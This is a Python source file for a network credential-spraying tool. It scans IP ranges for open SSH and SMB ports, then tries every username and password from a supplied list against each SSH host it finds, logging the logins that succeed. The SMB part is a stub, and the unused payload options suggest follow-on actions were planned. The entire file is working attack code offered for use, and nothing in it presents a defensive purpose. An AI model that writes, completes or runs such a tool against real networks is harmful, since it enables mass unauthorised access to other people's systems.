#!/usr/bin/env python3

import os
import random
import asyncio
import argparse
import paramiko

from ipaddress import ip_network
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple, Dict


SERVICES = {
    'ssh': {
        'port': 22
    },
    'smb': {
        'port': 445,
    }
}


class TCPScanner(object):

    def __init__(self, open_queues: Dict[int, asyncio.Queue], timeout=5.0, max_workers=32):
        self.timeout = timeout
        self.max_workers = max_workers
        self.tcp_queue = asyncio.Queue()
        self.open_queues = open_queues
        self.tcp_scan_completed = asyncio.Event()

    def _targets(self, targets: List[str], randomize=False) -> List[str]:
        ''' Lazily generate hosts in ip ranges '''
        all_targets = []
        for target in targets:
            all_targets.extend([str(ip) for ip in ip_network(target).hosts()])
        if randomize:
            random.shuffle(all_targets)
        return all_targets

    async def scan(self, targets: List[str]) -> None:
        ''' Scans a list of target networks/ips and ports, results are put into open queue '''
        tasks = []
        for _ in range(self.max_workers):
            tasks.append(asyncio.create_task(self._task_worker()))
        for ip in self._targets(targets):
            for port in self.open_queues.keys():
                await self.tcp_queue.put((ip, port))
        await self.tcp_queue.join()
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        self.tcp_scan_completed.set()

    async def _task_worker(self):
        while True:
            ip, port = (await self.tcp_queue.get())
            # print("[tcp worker] %s:%d" % (ip, port))
            conn = asyncio.open_connection(ip, port)
            try:
                await asyncio.wait_for(conn, self.timeout)
            except (asyncio.TimeoutError, ConnectionRefusedError):
                pass
            else:
                self.open_queues[port].put_nowait((ip, port,))
            finally:
                self.tcp_queue.task_done()


class LoginScanner(object):

    def __init__(self, queue: asyncio.Queue, credentials: Tuple[str, str], tcp_scan_completed: asyncio.Event, timeout=5.0, max_workers=32):
        self.queue = queue
        self.credentails = credentials
        self.timeout = timeout
        self.max_workers = max_workers
        self.tcp_scan_completed = tcp_scan_completed
        self.scan_completed = asyncio.Event()
        self.scan_queue = asyncio.Queue()
        self.results = []
        self.thread_pool = ThreadPoolExecutor(max_workers=self.max_workers)


class SSHLoginScanner(LoginScanner):

    async def scan(self):
        tasks = []
        tasks.append(asyncio.create_task(self._producer()))
        for _ in range(self.max_workers):
            tasks.append(asyncio.create_task(self._task_worker()))
        await self.tcp_scan_completed.wait()
        await self.queue.join()
        await self.scan_queue.join()
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        self.scan_completed.set()
    
    async def _producer(self):
        while True:
            ip, port = (await self.queue.get())
            for username, password in self.credentails:
                await self.scan_queue.put((ip, port, username, password,))
            self.queue.task_done()

    async def _task_worker(self):
        while True:
            try:
                ip, port, username, password = (await self.scan_queue.get())
                fake_future = self.thread_pool.submit(self.login_attempt, ip, port, username, password)
                result = await asyncio.wrap_future(fake_future)
                if result:
                    self.results.append((ip, port, username, password))
                self.scan_queue.task_done()
            except Exception as err:
                print(err)

    @staticmethod
    def login_attempt(ip: str, port: int, username: str, password: str) -> bool:
        print('[ssh worker] Login attempt %s@%s:%d (pw: %s)' % (username, ip, port, password))
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, port=port, username=username, password=password)
            return True
        except Exception as err:
            print('[paramiko] %s (%s)' % (err, type(err)))
        return False


class SMBLoginScanner(LoginScanner):

    pass



def load_credentials(args) -> List[Tuple[str, str]]:
    with open(args.credentials) as fp:
        lines = [line.strip() for line in fp.readlines()]
    return [line.split(':', 1) for line in lines]


async def main(args):
    credentials = load_credentials(args)

    # Create per-port/service queues
    ports = [SERVICES[service]['port'] for service in args.services]
    open_queues = dict((port, asyncio.Queue(),) for port in ports)

    # Start the TCP scanner
    tcp_scanner = TCPScanner(open_queues, args.timeout)
    tcp_scan = asyncio.create_task(tcp_scanner.scan(args.targets))

    ssh_queue = open_queues[SERVICES['ssh']['port']]
    ssh_scanner = SSHLoginScanner(ssh_queue, credentials, tcp_scanner.tcp_scan_completed)
    ssh_scan = asyncio.create_task(ssh_scanner.scan())

    await tcp_scan
    print('[*] TCP scan completed')
    await ssh_scan
    print('[*] SSH scan completed')
 
    print('ssh results: %r' % ssh_scanner.results)



class ValidatServicesAction(argparse.Action):

    def __call__(self, parser, namespace, values, option_string=None):
        for service in values:
            if service not in SERVICES:
                raise ValueError('Unsupported service %s' % service)
        setattr(namespace, self.dest, values)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Credential sprayer and preyer',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('--version',
        action='version',
        version='%(prog)s v0.0.1'
    )
    parser.add_argument('--max-workers', '-w',
        help='max number of workers per queue',
        dest='max_workers',
        type=int,
        default=min(32, os.cpu_count() + 4)
    )
    parser.add_argument('--timeout', '-T',
        help='connection timeout in seconds',
        dest='timeout',
        type=float,
        default=1.0
    )
    parser.add_argument('--targets', '-t',
        help='target ip cidr range(s) or ip address(es)',
        dest='targets',
        nargs='*',
        required=True,
    )
    parser.add_argument('--credentials', '-c',
        help='credential file (username:password newline delimited)',
        dest='credentials',
        required=True,
    )
    parser.add_argument('--services', '-s',
        help='list of services to scan/spray',
        dest='services',
        nargs='*',
        default=list(SERVICES.keys()),
        action=ValidatServicesAction
    )
    parser.add_argument('--ssh-payload', '-ssh',
        help='',
        dest='ssh_payload',
        default=None,
    )
    parser.add_argument('--smb-payload', '-smb',
        help='',
        dest='smb_payload',
        default=None,
    )
    asyncio.run(main(parser.parse_args()))

